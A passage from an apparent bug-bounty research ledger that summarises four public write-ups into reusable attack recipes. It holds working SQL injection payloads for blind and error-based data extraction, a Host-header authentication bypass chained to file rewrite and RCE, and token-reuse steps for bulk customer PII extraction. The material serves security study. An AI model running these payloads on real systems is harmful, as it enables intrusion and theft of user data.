  4. TEMPLATE (verbatim): `'%2bconvert(char,(SELECT IIF(SUBSTRING((***query_here***),1,1)='d',3,@@VERSION)))%2b`; inner: `db_name()`, `host_name()`, `select top 1 table_name from INFORMATION_SCHEMA.tables`, `select top 1 column_name from INFORMATION_SCHEMA.columns`, `select ***column_name*** from ***table_name*** ORDER BY ***column_name*** OFFSET 2 ROW FETCH FIRST 1 ROW ONLY`.
DETECTION SIGNAL: a 2-state non-verbose oracle (Error page vs normal/AccessDenied page, or a Location-redirect difference) with no reflected error text; quote-parity; IIS/.aspx (MSSQL). `convert(int,...)` errors while `convert(char,...)` succeeds = you control a convert in an evaluated context.
CHAIN: SQLi in `name` (primitive; only a 2-state oracle) -> `convert(char, IIF(cond,3,@@VERSION))` makes convert succeed/fail on the boolean (esc. blind error-based -> boolean) -> Intruder Cluster Bomb reads db_name/host_name/schema/rows (data exfil) -> Critical (full DB read).
TRANSFERABLE TEST: when SQLi shows only an error-page-vs-normal 2-state signal and no verbose errors, build `'<concat>convert(<char>,(SELECT IIF(<COND>,3,<non-convertible expr like @@VERSION>)))<concat>` and branch on which page/Location returns: success-page = TRUE, error-page = FALSE; then Intruder Cluster Bomb index x charset, grepping the Location header. Rule: **when the error text is hidden, make the type-conversion itself the boolean — one branch converts cleanly (normal page), the other errors (error page).**
DEDUPE/DELTA: `IIF(`, `@@VERSION`, `convert(char`, `AccessDenied.aspx`, `SUBSTRING(DB_NAME`, `blind error based`, `85d6be3ca23b`, `ozguralp` = 0 hits across the three write targets (the `AccessDenied` hits are all S3/Referer contexts). SOURCE: http://www.firstsight.me/2020/11/optimizing-hunting-results-in-vdp-for-use-in-bug-bounty-programs-from-sensitive-information-disclosure-to-accessing-hidden-apis-which-can-be-used-to-retrieve-customer-data/  2026-11-11
ROUTE: live web_extract truncated mid-article -> recovered COMPLETE via direct curl of the live page + local tag-strip (37,543 chars). Author Th3g3nt3lman (firstsight.me), published 2020-11-15; Bugcrowd points-only + bounty program ("mainredacted.target.tld"); 6 paid P1s across Oct 2019 – Sept 2020.
STATUS: UNVERIFIED (not reproduced — anonymized program, no lab this pass).
CLASS: broken access control / authentication bypass (pre-auth token reuse on an internal customer-data API) + hidden legacy API variant replay after feature remediation -> customer PII at scale.
CORE METHOD:
  1. STALE-RECON ARCHIVE: keep every hunting artifact across years and programs — May 2018 unprotected Jira ("discussion and screenshots" with "email address (including credentials) and multiple endpoints", ~16 screenshots), Aug 2019 user-enumeration + SQLi + IDOR email lists, Dec 2019 test/stg Laravel debug-mode leak -> admin dashboard -> internal-employee CSV. Re-mine the whole archive when the bounty asset opens.
  2. PRE-AUTH TOKEN REUSE -> AUTH BYPASS (Oct 2019 P1): the internal customer-data API `POST /api/1stRedacted/2ndRedacted/1stendpoint` (X-CSRF-Token + Cookie + `email=` body) returns customer data only for accounts holding a hidden "commercial accounts" feature. Instead of a valid account, "I tried to retrieve the unique token and cookie (in this non-login state) to reuse it to that endpoint. In short, I managed to retrieve customer data without needing a valid account." Bugcrowd/owner re-classed it "authentication bypass", P1 $2,250.
  3. HIDDEN OLD API VARIANT AFTER REMEDIATION (Sept 2020 P1, the core): the developers "fixed" the feature by REPOINTING it — the UI now calls `GET /api/vx/.../2ndEndpoint?ParametercontainUserEmail=` returning only date + non-sensitive fields, and the old `POST /api/1stRedacted/2ndRedacted/1stendpoint` "doesn't work anymore". But an old report screenshot of the TEST version of the portal ("Accidentally, I showed a screenshot equipped with an HTTP Request view in Burpsuite") captured a THIRD request shape for the same data: `POST /api/vx/6thRedacted/3rdEndpoint` with `ParameterContainUserEmail` POST body. Replaying it against production: "I was able to extract customer details again via this endpoint. In short, we will be able to 'bypass' the protection of this feature by using the OLD API requests" (author's quotes on 'bypass': it is the old API "in the development area — which their developers hide in the production area").
  4. CORPUS ENUM: point the surviving endpoint at ~10,000 unique emails harvested from sibling assets (SubW/SubX/SubY/TargetXYZ) + GitHub recon — "it only took about 10 minutes" to find the accounts holding customer PII -> P1 $2,500 (max of range).
DETECTION SIGNAL: a sensitive feature "fixed" by switching API version/path (same interface, different response); old reports / Burp history / test,stg,uat captures naming other request shapes for the same feature; an internal API accepting only a CSRF token + cookie obtainable WITHOUT login; response content gated by a special account privilege/hidden feature column.
CHAIN: unprotected Jira (2018, P2 points) -> archived creds/endpoints/screenshots + email corpus from enum/SQLi/IDOR across sibling assets -> pre-auth token + cookie reuse on the internal customer-data API = customer data without any valid account (P1 "authentication bypass", $2,250) -> after remediation repoints the feature to a neutered API version, replay the OLD/PARALLEL API variant recovered from a test-env Burp screenshot -> customer-data extraction restored (bypass of the developer "protection") -> 10k-email enumeration over the surviving endpoint -> customer PII at scale (P1, $2,500).
TRANSFERABLE TEST: when a sensitive feature is "fixed" by switching API version/path: (1) diff the request flow before vs after and collect EVERY old request shape from old reports, Burp history and test/stg/uat captures; (2) replay each old/parallel variant against production with a low-priv session — if it still returns the sensitive fields, the remediation only repointed the frontend; (3) separately call the sensitive API with ONLY the token/cookie obtainable pre-login (issued by the login/public page) — acceptance is an auth bypass. Rule: **remediation-by-repointing leaves the old data route alive — recover the old request shape from test/stg artifacts and replay it; and a token obtainable without login is not authentication.**
DEDUPE/DELTA: `firstsight`, `ParameterContainUserEmail`, `commercial accounts`, `1stendpoint`, `6thRedacted` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: §17.535 (Symfony prod debug-mode -> credential disclosure — the S1 debug-mode leg is that same class and is NOT the recorded delta); §3.5 / Bykea #3085742 zombie endpoints (legacy endpoint + IDOR via identifier swap because authz middleware postdates it — here the account is legitimately privileged and the missing control is the FEATURE redesign, not authz); §17.491 (deleted records on deprecated feed renditions — a lifecycle-filter gap, not a neutered feature's old data route); the diff-sibling entry's footnote (~ledger 2838) "legacy API versions that skip the UI's check" — a detection-signal mention inside another class, no method recorded. NEW DELTA: remediation-by-repointing (old/parallel API variant survives the "fix") + pre-auth anonymous token/cookie accepted by an internal data API + stale-recon-archive chaining across programs/years. NEW general method -> §17.574.

SOURCE: https://medium.com/@mrnikhilsri/interesting-case-of-sqli-84cc3f4a5255  2026-11-11
ROUTE: live web_extract served COMPLETE (InfoSec Write-ups). Nikhil (niks), published 2020-11-12; Synack hosted e-invoicing solution; accepted in hours, $3k (Synack max for SQLi).
STATUS: UNVERIFIED (not reproduced — Synack target, no lab this pass).
CLASS: SQLi (full data extraction) reached via auth-loop bypass — replaying request shapes harvested from an unauthenticated DEMO instance of the same third-party product.
CORE METHOD:
  1. LOGIN-REDIRECT LOOP AS A MAP: unauthenticated testing; every dir/file brute "keep redirecting me to a login page ... login page redirecting me to portal page, hence creating a loop"; method changes don't help. The loop fires "only in directories under /portal/ which looks like a core part of the application" — the rest of the surface is not loop-gated, just undiscovered.
  2. PRODUCT IDENTIFICATION -> DEMO ORACLE: the app is a "hosted e-invoicing solution" (third-party); no public copy ("a demo will be available on request"), nothing on GitHub; the vendor's YouTube demo leaks "Invoice details of all of their clients and few rxss". Subdomain scan (subfinder) -> "plenty of subdomains that have demo instance running ... they weren't even password-protected" while client subdomains show the same redirect loop.
  3. REQUEST REPLAY (core): "instead of application path, I captured all post requests from demo instances and replaced the domain to in-scope application domain and then replayed it. To my surprise, it worked without a redirect loop." Real client flows use "very specific links ... generated and sent to their email" (magic links), so the direct POST endpoints never enforce the login loop.
  4. SQLi: "I quickly check the SQLi on a parameter and as expected it was vulnerable too. I quickly run sqlmap and got access to all data."
DETECTION SIGNAL: a third-party/hosted product behind a login-redirect loop; demo/stg/test subdomains of the SAME product running unauthenticated; POST/API traffic the demo UI issues that the in-scope UI never shows; a loop confined to one directory prefix (`/portal/`) while other paths behave differently.
CHAIN: product identification (login page/JS/vendor material) -> open demo instances found by subdomain enum (unauth) -> capture their POST requests -> replay against the in-scope host with only the Host swapped (bypasses the login-redirect loop, reaches the hidden backend endpoints) -> SQLi in a parameter of the replayed request -> sqlmap full data extraction (accepted; $3k).
TRANSFERABLE TEST: when a third-party product blocks unauth discovery with a login-redirect loop: (1) identify the vendor product and find its demo/test instances via `subfinder` + `demo|stg|uat|test` name filters (or vendor demo videos); (2) capture the demo's POST/API requests in Burp and replay them against the in-scope domain unchanged except Host — a response WITHOUT the redirect loop proves the endpoint is reachable unauthenticated; (3) fuzz every parameter of the replayed requests for SQLi. Rule: **a vendor demo of the same product is a request-shape oracle — replay its traffic against the real host to skip the login loop.**
DEDUPE/DELTA: `mrnikhilsri`, `84cc3f4a5255`, `e-invoicing`, `demo instances`, `replaced the domain` = 0 hits across the three write targets (the single `demo instance` hit is ledger 11482, an Azure `adx()` public-demo context — unrelated). Related-but-distinct REVIEWED: V-02 classic UNION SQLi (the SINK is standard — the recorded delta is the ENTRY); §17.405-family "public demo instance" (a token-theft operator, different class). NEW DELTA: an unauthenticated demo tenant of the same product as a request-template oracle + login-redirect-loop bypass. NEW general method -> §17.575.

SOURCE: https://medium.com/realmodelabs/silver-peak-unity-orchestrator-rce-2928d65ef749  2026-11-11
ROUTE: live web_extract served COMPLETE (Realmode Labs, SD-PWN Part 1 — Silver Peak Unity Orchestrator; HPE Silver Peak; CVE-2020-12145/12146/12147; all resolved by publication, 2020).
STATUS: UNVERIFIED (not reproduced — vendor advisory chain, no lab this pass).
CLASS: authentication bypass (Host-header localhost trust) -> arbitrary file delete (path traversal) + arbitrary SQL execution -> RCE. Silver Peak Unity Orchestrator (CentOS + Java web server).
CORE METHOD:
  1. THE GUARD READS THE HOST HEADER (CVE-2020-12145): API calls "originating from localhost" skip authentication; the check is literally `request.getBaseUri().getHost().equals("localhost")` — "Any requests with 'localhost' as their HTTP Host header will satisfy this check. This can be easily forged in remote requests of course." Send `Host: localhost` -> the entire localhost-only API surface is unauthenticated.
  2. ARBITRARY FILE DELETE (CVE-2020-12146): `/gms/rest/debugFiles/delete` (cleanup leg of a debug-log-upload-to-S3 mechanism) "does not check for path traversal, creating the ability to delete any file on the system (if permissions allow)".
  3. ARBITRARY SQL EXECUTION -> FILE WRITE (CVE-2020-12147): `/gms/rest/sqlExecution` runs arbitrary SQL, "accessible only by localhost but same as in the Authentication Bypass this can be easily executed remotely"; leverage to arbitrary file write via `INTO DUMPFILE` — "INTO DUMPFILE does not allow overwriting a file but one can use the 'File Delete Path Traversal' issue to first delete the file and then rewrite it."
  4. RCE: "Look for a file being run by the web server" — `/home/gms/gms/phantomGenImg.js` (report generation, executed by PhantomJS) -> delete it (step 2) -> recreate it with attacker JS via `INTO DUMPFILE` (step 3) -> trigger report generation -> PhantomJS "contains the `child_process` module making it possible to run arbitrary shell commands on the system".
DETECTION SIGNAL: an API that skips auth when the request "comes from localhost" and the check reads the Host / forwarded header instead of the socket peer; debug-log-upload mechanisms with a delete/cleanup endpoint taking a filename; an SQL-execution endpoint; web-server-executed script/report-generation files on disk (node/PhantomJS/template engines).
CHAIN: unauth remote attacker sends `Host: localhost` -> auth bypass on the localhost-only API (CVE-2020-12145) -> `/gms/rest/sqlExecution` arbitrary SQL (CVE-2020-12147) + `/gms/rest/debugFiles/delete` path-traversal file delete (CVE-2020-12146) -> delete `phantomGenImg.js` and rewrite it with `INTO DUMPFILE` (delete-then-write completes the non-overwriting write) -> trigger PhantomJS report generation -> shell via `child_process` -> RCE as the web server on an SD-WAN orchestrator (P1: "no authentication whatsoever ... shutdown a company's entire international network").
TRANSFERABLE TEST: (1) on any app with a "localhost/internal-only" API, replay those endpoints with `Host: localhost` (plus `X-Forwarded-Host: localhost`, `X-Forwarded-For: 127.0.0.1`) — a 200 from an external peer is the auth bypass; (2) if that surface has SQL exec and/or a non-overwriting file write (`INTO DUMPFILE`), pair it with any file-delete/path-traversal to rewrite a web-server-executed file (report-generation scripts, templates, cron'd JS); (3) trigger the execution path. Rule: **a trust check on the request's Host header is attacker-controlled — `Host: localhost` opens the localhost-only API; and a non-overwriting file write is completed by a file delete.**
DEDUPE/DELTA: `Silver Peak`, `Unity Orchestrator`, `2928d65ef749`, `CVE-2020-12145`, `CVE-2020-12147`, `DUMPFILE`, `phantomGenImg`, `debugFiles`, `sqlExecution`, `getBaseUri` = 0 hits across the three write targets (the `12146` grep hits are HackerOne report id `121461`, unrelated). Related-but-distinct REVIEWED and NOT re-recorded: ledger 15921 / §17.534 (Web Help Desk CVE-2021-35232 — a "localhost-only" API defeated by a SAME-HOST REVERSE PROXY plus hardcoded creds -> arbitrary HQL; different guard-defeat, different sink); Bugbountyskills 12439 (V-01 SSRF premise "trusts localhost, RFC1918..." — a fetch-class trust, not a Host-header auth check); §11.4 / V-06 Host header = reset-link poisoning (different impact); #398799 Host-header-built-URL SSRF (different sink). V-10 records `INTO OUTFILE` webshells but NOT the `INTO DUMPFILE` non-overwrite constraint paired with a file DELETE. NEW DELTA: Host-header-as-trust-check auth bypass + delete-then-DUMPFILE rewrite of an executed script. NEW general method -> §17.576. NOTE: SD-PWN Part 4 (VMware VeloCloud) is a DIFFERENT product already in this ledger from batch 203 — this Part 1 chain is distinct from it.

SOURCE: https://ynoof.medium.com/error-based-sql-injection-on-a-wordpress-website-and-extract-more-than-150k-user-details-f65f987c2cc0  2026-11-11
ROUTE: live web_extract returned the article truncated at the bypass section; the Medium JS wall blocked curl (6 KB shell) and r.jina.ai refused this egress (401 bad-IP-reputation); recovered COMPLETE via the Wayback Machine snapshot (web.archive.org 20251016100144) + local tag-strip. Ynoof Alassiri, published 2020-10-27; WordPress custom plugin (`wp_news_posts`), MariaDB 10.3.14; 150k+ user rows (eCommerce).
STATUS: UNVERIFIED (not reproduced — no lab this pass).
CLASS: SQLi (error-based extraction) in an ORDER BY clause, with the SQL error rendered ONLY in the page SOURCE.
CORE METHOD:
  1. DETECTION: `?sort=1'` shows nothing rendered — "some people will leave the website ... so I go to the page source, and I found the following Error" — a hidden `<div id="error"><p class="wpdberror"><strong>WordPress database error:</strong> [...] near '\\' ASC LIMIT 10 OFFSET 4120` carrying the FULL query (`ORDER BY p.<input> ASC LIMIT 10 OFFSET 4120`, `wp_news_posts` LEFT JOIN `wp_news_categories`). Author's lesson: "always try to view the page source".
  2. CONTEXT RULE: the injection point sits in ORDER BY BEFORE the LIMIT -> exploitable ("if the injection after limit you can't execute SQL Injection in this case, but in my case, the injection point is before the LIMIT so it is possible").
  3. QUOTE-ESCAPE TRAP + NORMALIZATION: `1'--`, `1'-- -`, `1'/`, `1'#` all fail — the quote is backslash-escaped (`p.1\\' ASC`), comment terminators never close; the error `Unknown column 'p.1' in 'order clause'` LEAKS the table's column names ("the most beautiful thing in this error is shown some of the columns"). Fix: replace `sort` with a REAL column name (`CategoryId`) so the query compiles, then APPEND payloads after it.
  4. ERROR-BASED ENGINE (the extractor): GROUP BY duplicate-entry — `sort=CategoryId and (SELECT 0 FROM (SELECT count(*), CONCAT((SELECT @@version), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y)` -> `Duplicate entry '10.3.14-MariaDB~1' for key 'group_key'`. Same shape for `database()` (-> `prd2`), tables (`concat(cast(table_name as char),0x7e) ... limit 0,1`), columns (identifier hex-encoded: `table_name=0x77705f7573657273` = `wp_users`), rows: `concat(cast(concat(ID,0x7e,user_login,0x7e,user_pass,0x7e,user_email) as char),0x7e) from prd2.wp_users limit 0,1`.
  5. BULK: step `limit N,1`, or slide `substring(group_concat(table_name),1,150)` -> `20,150`, `40,150` (fallback `substr`/`mid`), then Burp Intruder Grep-Extract on the `Duplicate entry` line -> "extract the data of more than 150k users" (ID, user_login, user_pass, user_email).
DETECTION SIGNAL: a sort/order parameter where `'` produces no rendered change; `Unknown column '<prefix>.<value>' in 'order clause'` (error leaks schema); WPDB errors present in the HTML SOURCE (`div id="error"`, `wpdberror`) while the rendered page is clean; quote-escaped ORDER BY context (comment terminators dead).
CHAIN: `?sort=` ORDER BY injection (primitive; quote-escaped, comments dead) -> SQL error hidden in page SOURCE reveals the full query + column names (esc.: schema oracle) -> valid-column normalization makes the query compile -> `FLOOR(RAND(0)*2)` GROUP BY duplicate-entry error-based extraction -> version/db/table/column/rows incl. `wp_users` hashes + emails -> 150k+ user records from an eCommerce site (Critical: credential + PII dump enabling ATO at scale).
TRANSFERABLE TEST: on a sort/order param where `'` shows nothing: (1) VIEW SOURCE (and diff raw responses) for `wpdberror`/hidden error divs before declaring the param clean; (2) read the leaked query — note the column prefix (`p.<input>`) and whether quotes are escaped; (3) feed a REAL column name to normalize, then append `and (SELECT 0 FROM (SELECT count(*),CONCAT((SELECT <expr>),0x23,FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y)` and read the value out of `Duplicate entry '<value>~1' for key 'group_key'`; (4) window with `substring(group_concat(<col>),N,150)` and Intruder Grep-Extract. Rule: **first look where the error is NOT rendered (page source); in a quote-escaped ORDER BY, normalize with a real column name, then let `FLOOR(RAND(0)*2)` GROUP BY print the value in the duplicate-key error.**
DEDUPE/DELTA: `ynoof`, `f65f987c2cc0`, `wpdberror`, `FLOOR(RAND`, `group_key`, `wp_news_posts`, `AggregatorId`, `Duplicate entry` = 0 hits across the three write targets. Related-but-recorded REVIEWED: V-01 error-based extraction (`EXTRACTVALUE`/`UPDATEXML` payload table, Bugbountyskills 10670-10671 / 10945-10975) — same PURPOSE, different ENGINE; the duplicate-entry `FLOOR(RAND(0)*2)` extractor is recorded in NO form (it is the engine for when xpath functions are filtered and for errors only visible in source). The batch-203 marxchryz ORDER BY entry shares the carrier but records time-based blind + `/*!500NN*/` version oracle, not error-based extraction nor the page-source-hidden error. NEW DELTA: hidden-in-source WPDB error + quote-escaped ORDER BY normalization (real column name first) + duplicate-entry engine + `substring(group_concat(...))` window + Intruder Grep-Extract. NEW general method -> §17.577.
